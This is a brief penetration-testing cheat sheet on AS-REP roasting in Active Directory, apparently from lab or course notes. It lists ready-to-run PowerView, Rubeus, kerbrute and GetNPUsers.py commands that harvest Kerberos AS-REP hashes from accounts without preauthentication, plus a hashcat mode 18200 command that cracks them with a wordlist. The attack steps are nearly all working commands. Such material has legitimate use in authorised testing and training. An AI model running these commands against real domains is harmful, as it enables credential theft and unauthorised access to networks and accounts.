# 01.03 AS-REP Roasting

> Pull AS-REPs for accounts flagged `DONT_REQ_PREAUTH` and crack with hashcat mode 18200.

## Overview

Accounts with 'Do not require Kerberos preauthentication' set return an AS-REP without authentication. Enumerate with PowerView Get-DomainUser -PreauthNotRequired or kerbrute (which auto-captures hashes). Hash mode 18200 in hashcat.

## Steps

- PowerView: Get-DomainUser -PreauthNotRequired.
- Rubeus asreproast /user /nowrap /format:hashcat — targeted capture.
- kerbrute userenum — auto-captures AS-REP hashes for qualifying users.
- GetNPUsers.py with user list — bulk AS-REP from Linux.
- hashcat -m 18200 to crack.

## Commands

### PowerView enumerate

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

### Rubeus asreproast

```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

### GetNPUsers.py

```bash
GetNPUsers.py <DOMAIN>.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

### hashcat AS-REP

```bash
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```
